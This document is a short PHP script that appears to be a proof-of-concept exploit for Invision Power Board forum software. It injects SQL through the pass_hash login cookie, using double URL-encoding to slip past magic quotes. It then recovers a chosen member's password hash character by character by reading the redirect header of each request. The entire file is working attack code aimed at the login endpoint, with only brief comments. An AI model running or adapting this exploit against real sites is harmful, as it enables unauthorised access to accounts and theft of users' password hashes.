<?php
$server = "SERVER";
$port = 80;
$file = "PATH";

$target = 81;

/* User id and password used to fake-logon are not important. '10' is a
random number. */
$id = 10;
$pass = "";

$hex = "0123456789abcdef";
for($i = 1; $i <= 32; $i++ ) {
        $idx = 0;
        $found = false;

        while( !($found) ) {
                $letter = substr($hex, $idx, 1);

                /* %2527 translates to %27, which gets past magic quotes.
This is translated to ' by urldecode. */
                $cookie =
"member_id=$id;pass_hash=$pass%2527%20OR%20id=$target";
                $cookie .=
"%20HAVING%20id=$target%20AND%20MID(`password`,$i,1)=%2527" . $letter;

                /* Query is in effect: SELECT * FROM ibf_members
                                       WHERE id=$id AND password='$pass' OR
id=$target
                                       HAVING id=$target AND
MID(`password`,$i,1)='$letter' */

                $header = getHeader($server, $port, $file .
"index.php?act=Login&CODE=autologin", $cookie);
                if( !preg_match('/Location:(.*)act\=Login\&CODE\=00\r\n/',
$header) ) {
                        echo $i . ": " . $letter . "\n";
                        $found = true;

                        $hash .= $letter;
                } else {
                        $idx++;
                }
        }
}

echo "\n\nFinal Hash: $hash\n";

function getHeader($server, $port, $file, $cookie) {
        $ip = gethostbyname($server);
        $fp = fsockopen($ip, $port);

        if (!$fp) {
                return "Unknown";
        } else {
                $com = "HEAD $file HTTP/1.1\r\n";
                $com .= "Host: $server:$port\r\n";
                $com .= "Cookie: $cookie\r\n";
                $com .= "Connection: close\r\n";
                $com .= "\r\n";

                fputs($fp, $com);

                do {
                        $header.= fread($fp, 512);
                } while( !preg_match('/\r\n\r\n$/',$header) );
        }

        return $header;
}
?>

